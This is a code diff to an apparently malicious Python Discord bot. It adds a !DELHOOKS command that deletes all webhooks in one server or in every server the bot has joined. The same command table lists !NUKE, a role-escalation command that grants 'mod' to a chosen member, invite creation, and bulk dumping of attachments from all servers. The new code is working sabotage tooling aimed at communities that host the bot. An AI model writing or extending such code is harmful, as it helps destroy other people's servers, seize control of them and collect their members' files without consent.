@@ -249,8 +249,9 @@ async def usage(command=None):
         '!INV': '!INV <server_id> - creates an invite link for a specific server.',
         '!MOD': '!MOD <server_id> <member_id|member_name> - grants the "mod" role to a specified member.',
         '!LEAVE': '!LEAVE - makes the bot leave all servers it is in.',
-        '!DUMPATTS': '!DUMPATTS - Dumps all attachments into a dumps folder of a specified server or all servers if --all is used.',
-        '!USAGE': '!USAGE [command] - displays usage information for all commands or a specific command if specified.',
+        '!DUMPATTS': '!DUMPATTS - <server_id> [--all] Dumps all attachments into a dumps folder of a specified server or all servers if --all is used.',
+        '!DELHOOKS': '!DELHOOKS - <server_id> [--all] Deletes all webhooks in a specified server or all if -all is specified',
+        '!USAGE': '!USAGE [command] - displays usage information for all commands or a specific command if specified.'
     }
     if command:
         print(usage_info.get(command.upper(), "no usage information available for this command."))
@@ -258,6 +259,40 @@ async def usage(command=None):
         print("usage info:")
         for cmd, desc in usage_info.items():
             print(desc)
+
+async def delhooks(*args):
+    if '--all' in args:
+        for guild in client.guilds:
+            await delwebinsrv(guild)
+        print("deleted webhooks in all servers.")
+    else:
+        guild_id = args[0]
+        guild = discord.utils.get(client.guilds, id=int(guild_id))
+        if not guild:
+            print(f"no server found with ID: {guild_id}")
+            return
+        await delwebinsrv(guild)
+        print(f"deleted webhooks in server {guild.name}.")
+
+async def delwebinsrv(guild):
+    webhooks = []
+    for channel in guild.text_channels:
+        try:
+            webhooks_in_channel = await channel.webhooks()
+            webhooks.extend(webhooks_in_channel)
+        except Exception as e:
+            print(f"failed to get webhooks from {channel.name}: {e}")
+    
+    if not webhooks:
+        print(f"no webhooks found in server {guild.name}.")
+        return
+    
+    for webhook in webhooks:
+        try:
+            await webhook.delete()
+            print(f"deleted webhook: {webhook.name}")
+        except Exception as e:
+            print(f"failed to delete webhook {webhook.name}: {e}")
 
 async def loop():
     commands = {
@@ -270,7 +305,8 @@ async def loop():
         '!MOD': escalatemod,
         '!NUKE': nuke,
         '!USAGE': usage,
-        '!DUMPATTS': dumpatts
+        '!DUMPATTS': dumpatts,
+        '!DELHOOKS': delhooks 
     }
 
     while True:
